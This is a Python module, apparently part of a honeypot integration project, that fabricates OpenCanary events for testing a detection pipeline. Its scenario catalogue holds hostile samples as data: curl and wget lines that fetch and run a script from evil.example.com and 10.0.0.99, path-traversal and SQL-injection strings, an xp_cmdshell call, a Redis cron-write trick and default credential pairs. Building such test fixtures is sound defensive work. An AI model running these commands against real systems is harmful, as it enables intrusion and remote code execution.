"""
Dummy OpenCanary event generator.

Produces OpenCanaryEvent objects that look exactly like JSON payloads emitted
by a real OpenCanary deployment, without needing a live honeypot process.

Each attack scenario maps to realistic logtype codes, source IP ranges, ports,
and logdata payloads so downstream pipeline components (logtype_map, session
tracker, policy engine) behave identically to production.
"""

from __future__ import annotations

import random
import time
from datetime import datetime, timezone
from typing import Any

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))

from opencanary_integration.ingest.models import OpenCanaryEvent


# ---------------------------------------------------------------------------
# Logtype catalogue (mirrors OpenCanary's internal codes)
# ---------------------------------------------------------------------------

_LOGTYPES: dict[str, list[dict[str, Any]]] = {
    # --- Reconnaissance ---
    "port_scan": [
        {"logtype": 2000, "dst_port": 0,
         "logdata": {"HOST_COUNT": 254, "PORT_COUNT": 1024, "NMAP_OS": "Linux"}},
    ],
    "http_probe": [
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/", "HOSTNAME": "honeypot.internal", "METHOD": "GET",
                     "USERAGENT": "Mozilla/5.0 (compatible; Googlebot/2.1)"}},
        {"logtype": 18000, "dst_port": 8080,
         "logdata": {"PATH": "/robots.txt", "METHOD": "GET",
                     "USERAGENT": "curl/7.68.0"}},
    ],
    "snmp_probe": [
        {"logtype": 10000, "dst_port": 161,
         "logdata": {"COMMUNITY": "public", "VERSION": "2c"}},
    ],
    "banner_grab": [
        {"logtype": 17000, "dst_port": 22,
         "logdata": {"BANNER": "OpenSSH_8.2p1", "PROTOCOL": "TCP"}},
        {"logtype": 17000, "dst_port": 21,
         "logdata": {"BANNER": "vsftpd 3.0.3", "PROTOCOL": "TCP"}},
    ],

    # --- Analysis ---
    "ftp_probe": [
        {"logtype": 3000, "dst_port": 21,
         "logdata": {"USERNAME": "anonymous", "PASSWORD": "test@example.com"}},
        {"logtype": 3000, "dst_port": 21,
         "logdata": {"USERNAME": "ftpuser", "PASSWORD": "password123",
                     "FILENAME": "/etc/passwd"}},
    ],
    "http_dir_scan": [
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/admin", "METHOD": "GET",
                     "USERAGENT": "DirBuster-1.0"}},
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/.env", "METHOD": "GET",
                     "USERAGENT": "WFuzz/3.1.0"}},
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/wp-admin/login.php", "METHOD": "POST",
                     "USERAGENT": "WPScan v3.8"}},
    ],
    "git_probe": [
        {"logtype": 16000, "dst_port": 9418,
         "logdata": {"REPO": "/.git/config", "METHOD": "GET"}},
    ],
    "tftp_probe": [
        {"logtype": 15000, "dst_port": 69,
         "logdata": {"FILENAME": "pxelinux.cfg", "MODE": "octet"}},
    ],

    # --- Fuzzers ---
    "http_fuzzer": [
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/../../../etc/shadow", "METHOD": "GET",
                     "USERAGENT": "sqlmap/1.7"}},
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/index.php?id=1' OR '1'='1", "METHOD": "GET",
                     "USERAGENT": "sqlmap/1.7"}},
        {"logtype": 1000, "dst_port": 80,
         "logdata": {"PATH": "/%2e%2e/%2e%2e/etc/passwd", "METHOD": "GET",
                     "USERAGENT": "Nikto/2.1.6"}},
    ],

    # --- Exploits ---
    "ssh_brute": [
        {"logtype": 22000, "dst_port": 22,
         "logdata": {"USERNAME": "root", "PASSWORD": "toor"}},
        {"logtype": 22000, "dst_port": 22,
         "logdata": {"USERNAME": "admin", "PASSWORD": "admin123"}},
        {"logtype": 22000, "dst_port": 22,
         "logdata": {"USERNAME": "ubuntu", "PASSWORD": "ubuntu"}},
    ],
    "telnet_login": [
        {"logtype": 7000, "dst_port": 23,
         "logdata": {"USERNAME": "admin", "PASSWORD": "1234"}},
    ],
    "mysql_exploit": [
        {"logtype": 5000, "dst_port": 3306,
         "logdata": {"USERNAME": "root", "PASSWORD": "",
                     "SQL": "SHOW DATABASES; UNION SELECT 1,2,3"}},
    ],
    "mssql_exploit": [
        {"logtype": 6000, "dst_port": 1433,
         "logdata": {"USERNAME": "sa", "PASSWORD": "sa",
                     "SQL": "EXEC xp_cmdshell('whoami')"}},
    ],
    "redis_exploit": [
        {"logtype": 14000, "dst_port": 6379,
         "logdata": {"CMD": "CONFIG SET dir /var/spool/cron",
                     "ARGS": ["CONFIG", "SET", "dbfilename", "root"]}},
    ],

    # --- Backdoors ---
    "smb_access": [
        {"logtype": 9000, "dst_port": 445,
         "logdata": {"SHARE": "C$", "PATH": "\\Windows\\System32\\",
                     "FILENAME": "lsass.exe", "DOMAIN": "WORKGROUP"}},
        {"logtype": 9000, "dst_port": 445,
         "logdata": {"SHARE": "ADMIN$", "PATH": "\\",
                     "FILENAME": ".ssh/authorized_keys", "DOMAIN": ""}},
    ],

    # --- Shellcode ---
    "vnc_login": [
        {"logtype": 12000, "dst_port": 5900,
         "logdata": {"PASSWORD": "12345678", "VERSION": "RFB 003.008"}},
        {"logtype": 13000, "dst_port": 5901,
         "logdata": {"PASSWORD": "vncpass", "VERSION": "RFB 003.003"}},
    ],
    "ssh_exec": [
        {"logtype": 22000, "dst_port": 22,
         "logdata": {"USERNAME": "root", "PASSWORD": "abc123",
                     "COMMAND": "curl http://evil.example.com/stage2.sh | bash"}},
        {"logtype": 22000, "dst_port": 22,
         "logdata": {"USERNAME": "ubuntu", "PASSWORD": "pass",
                     "COMMAND": "wget -qO- http://10.0.0.99/payload | sh"}},
    ],

    # --- Generic ---
    "generic_probe": [
        {"logtype": 11000, "dst_port": 5060,
         "logdata": {"METHOD": "OPTIONS", "URI": "sip:100@honeypot"}},
    ],

    # --- DOS ---
    "dos_flood": [
        {"logtype": 2000, "dst_port": 0,
         "logdata": {"HOST_COUNT": 1, "PORT_COUNT": 65535,
                     "NMAP_OS": "Unknown", "FLOOD": True}},
    ],
}

# Map friendly scenario names → attack category for documentation
SCENARIO_CATEGORY: dict[str, str] = {
    "port_scan": "RECONNAISSANCE", "http_probe": "RECONNAISSANCE",
    "snmp_probe": "RECONNAISSANCE", "banner_grab": "RECONNAISSANCE",
    "ftp_probe": "ANALYSIS", "http_dir_scan": "ANALYSIS",
    "git_probe": "ANALYSIS", "tftp_probe": "ANALYSIS",
    "http_fuzzer": "FUZZERS",
    "ssh_brute": "EXPLOITS", "telnet_login": "EXPLOITS",
    "mysql_exploit": "EXPLOITS", "mssql_exploit": "EXPLOITS",
    "redis_exploit": "EXPLOITS",
    "smb_access": "BACKDOORS",
    "vnc_login": "SHELLCODE", "ssh_exec": "SHELLCODE",
    "generic_probe": "GENERIC",
    "dos_flood": "DOS",
}

# Realistic source IP pools per scenario type
_RECON_IPS   = ["45.33.32.156", "198.20.69.74", "209.85.128.0",
                 "66.240.192.138", "71.6.165.200", "71.6.167.142"]
_EXPLOIT_IPS = ["192.168.10.50", "10.0.0.200", "172.16.5.100",
                 "192.168.100.5", "10.10.10.99"]
_GENERIC_IPS = ["203.0.113.1", "198.51.100.42", "192.0.2.7"]


class OpenCanaryEventGenerator:
    """
    Generates realistic OpenCanary events without a live honeypot process.

    Parameters
    ----------
    node_id : str
        Identifier for the emulated honeypot node (e.g. "honeypot-01").
    dst_host : str
        Honeypot's own IP address (populates dst_host field).
    seed : int | None
        RNG seed for reproducibility.
    """

    def __init__(
        self,
        node_id: str = "honeypot-emulator-01",
        dst_host: str = "192.168.1.100",
        seed: int | None = None,
    ) -> None:
        self.node_id  = node_id
        self.dst_host = dst_host
        self._rng     = random.Random(seed)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(
        self,
        scenario: str,
        src_ip: str | None = None,
    ) -> OpenCanaryEvent:
        """
        Generate a single OpenCanaryEvent for the given scenario name.

        Parameters
        ----------
        scenario : str
            One of the keys in SCENARIO_CATEGORY (e.g. "ssh_brute").
        src_ip : str | None
            Source IP to use.  If None, a realistic IP is chosen based on
            the scenario category.

        Returns
        -------
        OpenCanaryEvent
        """
        if scenario not in _LOGTYPES:
            raise ValueError(
                f"Unknown scenario {scenario!r}. "
                f"Valid: {sorted(_LOGTYPES.keys())}"
            )

        template = self._rng.choice(_LOGTYPES[scenario])
        src_ip   = src_ip or self._pick_ip(scenario)
        now      = datetime.now(timezone.utc)
        ts       = now.strftime("%Y-%m-%d %H:%M:%S.%f")

        return OpenCanaryEvent(
            dst_host   = self.dst_host,
            dst_port   = template["dst_port"],
            logdata    = dict(template["logdata"]),
            logtype    = template["logtype"],
            node_id    = self.node_id,
            src_host   = src_ip,
            src_port   = self._rng.randint(1024, 65535),
            utc_time   = ts,
            local_time = ts,
        )

    def generate_sequence(
        self,
        scenarios: list[str],
        src_ip: str | None = None,
        delay_ms: float = 0.0,
    ) -> list[OpenCanaryEvent]:
        """
        Generate an ordered sequence of events, optionally from the same IP
        (simulates a single attacker progressing through a kill chain).

        Parameters
        ----------
        scenarios : list[str]
            Ordered list of scenario names.
        src_ip : str | None
            Fixed source IP; random if None.
        delay_ms : float
            Milliseconds to sleep between events (0 = no sleep).
        """
        src_ip = src_ip or self._pick_ip(scenarios[0] if scenarios else "generic_probe")
        events: list[OpenCanaryEvent] = []
        for scenario in scenarios:
            events.append(self.generate(scenario, src_ip=src_ip))
            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)
        return events

    def generate_kill_chain(
        self,
        src_ip: str | None = None,
    ) -> list[OpenCanaryEvent]:
        """
        Generate a realistic full kill-chain sequence:
        recon → analysis → exploit → backdoor → shellcode.
        """
        stages = [
            "port_scan",
            "http_probe",
            "ftp_probe",
            "http_dir_scan",
            "ssh_brute",
            "smb_access",
            "ssh_exec",
        ]
        return self.generate_sequence(stages, src_ip=src_ip)

    def available_scenarios(self) -> list[str]:
        """Return all scenario names."""
        return sorted(_LOGTYPES.keys())

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _pick_ip(self, scenario: str) -> str:
        cat = SCENARIO_CATEGORY.get(scenario, "GENERIC")
        if cat in ("RECONNAISSANCE", "ANALYSIS", "GENERIC"):
            return self._rng.choice(_RECON_IPS)
        return self._rng.choice(_EXPLOIT_IPS)
